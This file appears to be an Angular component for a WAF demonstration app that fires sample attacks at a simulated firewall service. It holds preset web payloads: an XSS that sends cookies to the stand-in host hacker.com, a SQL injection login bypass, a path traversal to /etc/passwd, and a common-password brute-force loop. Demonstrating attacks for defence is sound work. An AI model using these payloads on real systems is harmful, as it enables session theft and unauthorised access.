import { Component, ChangeDetectionStrategy, inject, signal, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { WafService } from '../../services/waf.service';
import { FormsModule } from '@angular/forms';

interface AttackResult {
  timestamp: Date;
  attackType: string;
  payload: string;
  result: string;
  success: boolean;
}

type TargetEndpoint = '/reviews' | '/login' | '/products';

interface PresetPayload {
    name: string;
    payload: string;
    endpoint: TargetEndpoint;
    type: 'XSS' | 'SQL Injection' | 'Path Traversal';
}

@Component({
  selector: 'app-attacker',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './attacker.component.html',
  changeDetection: ChangeDetectionStrategy.OnPush,
})
export class AttackerComponent {
  private wafService = inject(WafService);
  attackLog = signal<AttackResult[]>([]);

  // Manual Attack
  manualEndpoint = signal<TargetEndpoint>('/reviews');
  manualPayload = signal('');
  
  presetPayloads: PresetPayload[] = [
      { name: 'Basic XSS', payload: `<img src=x onerror="alert('GuardX: XSS Attack Successful!')">`, endpoint: '/reviews', type: 'XSS' },
      { name: 'Cookie Stealer XSS', payload: `<script>document.location='http://hacker.com/?c='+document.cookie</script>`, endpoint: '/reviews', type: 'XSS' },
      { name: 'Login Bypass SQLi', payload: `' OR '1'='1'; --`, endpoint: '/login', type: 'SQL Injection' },
      { name: 'Path Traversal', payload: '../../../../etc/passwd', endpoint: '/products', type: 'Path Traversal' },
  ];

  // Brute Force
  isBruteForcing = signal(false);

  constructor() {
    effect(() => {
      const payloadFromGenerator = this.wafService.payloadForAttacker();
      if (payloadFromGenerator) {
        this.manualPayload.set(payloadFromGenerator);
        // Clear the signal so it's only used once
        this.wafService.payloadForAttacker.set('');
      }
    });
  }

  usePreset(preset: PresetPayload) {
    this.manualEndpoint.set(preset.endpoint);
    this.manualPayload.set(preset.payload);
  }

  launchManualAttack() {
    const payload = this.manualPayload();
    const endpoint = this.manualEndpoint();
    const result = this.wafService.processRequest({
      path: endpoint,
      method: 'POST',
      payload: payload,
    });
    this.logAttack('Manual Attack', payload, result);
  }

  async launchBruteForce() {
    this.isBruteForcing.set(true);
    const passwords = ['12345', 'password', 'admin', 'qwerty', 'pass123', 'root', '12345678'];
    for (let i = 0; i < passwords.length; i++) {
        if (!this.isBruteForcing()) break; // Allow stopping
        const payload = `admin:${passwords[i]}`;
        const result = this.wafService.processRequest({
          path: '/login',
          method: 'POST',
          payload: `brute-force-attempt-${i+1}`
        });
        this.logAttack('Brute-Force', payload, result);
        await new Promise(resolve => setTimeout(resolve, 300)); // delay between attempts
    }
    this.isBruteForcing.set(false);
  }

  stopBruteForce() {
    this.isBruteForcing.set(false);
  }

  private logAttack(attackType: string, payload: string, result: { success: boolean; message: string }) {
    this.attackLog.update(log => [
      {
        timestamp: new Date(),
        attackType,
        payload,
        result: result.message,
        success: result.success
      },
      ...log
    ].slice(0, 50));
  }
}